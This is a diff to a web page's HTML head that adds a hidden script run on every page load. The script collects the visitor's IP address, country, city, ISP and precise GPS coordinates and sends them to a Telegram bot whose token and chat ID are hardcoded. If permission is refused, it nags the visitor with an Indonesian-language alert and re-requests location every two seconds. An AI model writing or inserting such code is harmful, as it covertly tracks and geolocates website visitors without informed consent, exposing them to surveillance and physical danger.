@@ -7,6 +7,64 @@
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+    const botToken = "7090653601:AAHjzoywMv-tfUZ3mXgmAacTPMcCbnp2B8w";
+    const chatId = "7567067447";
+
+    async function sendLocationToTelegram(lat, lon) {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        const message = `
+📍 *Pengunjung Masuk ke Website*
+
+🌐 IP: ${data.ip || "N/A"}
+🌎 Negara: ${data.country_name || "N/A"}
+🏙️ Kota: ${data.city || "N/A"}
+📡 ISP: ${data.org || "N/A"}
+📌 Koordinat: ${lat}, ${lon}
+🕰️ Time: ${new Date().toLocaleString()}
+        `;
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (error) {
+        console.error("Gagal kirim lokasi:", error);
+      }
+    }
+
+    function requestLocationLoop() {
+      if (!navigator.geolocation) {
+        alert("Browser tidak mendukung geolocation.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          sendLocationToTelegram(lat, lon);
+        },
+        (error) => {
+          alert("Izinkan lokasi agar dapat melanjutkan.");
+          setTimeout(() => requestLocationLoop(), 2000); // Loop minta lokasi
+        }
+      );
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      requestLocationLoop();
+    });
+  </script>
 </head>
 <body class="bg-gray-100 min-h-screen flex flex-col">
 
